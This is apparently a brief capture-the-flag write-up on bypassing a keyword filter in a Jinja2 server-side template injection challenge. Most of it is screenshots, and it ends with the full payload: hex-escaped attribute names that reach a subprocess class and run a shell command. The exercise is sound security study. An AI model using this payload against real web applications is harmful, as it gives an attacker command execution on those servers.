![chal](https://github.com/user-attachments/assets/28fdc428-df1c-4b95-bba6-36a595572805)


![filter_detection](https://github.com/user-attachments/assets/23780694-a7e8-42fa-9c9a-179554acfd07)


Same as the previous `SSTI` challenge, but this time the server filters the some words to avoid our exploit. However, because Jinja2 is running in Python, so in order to bypass the filter, we can encode the payload to ASCII text and send it to the server ;).

![bypass_filter](https://github.com/user-attachments/assets/d90d80ae-fd66-4395-8ab7-4f3254e1a2c6)


![output](https://github.com/user-attachments/assets/445e00ee-3284-4572-8f63-94019cbb45dc)


The final payload is `{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5f\x67etitem\x5f\x5f')(356)('whoami',shell=True,stdout=-1)|attr('communicate')()}}`.

![flag](https://github.com/user-attachments/assets/dbd47460-267f-40db-998d-5a1639d1b804)
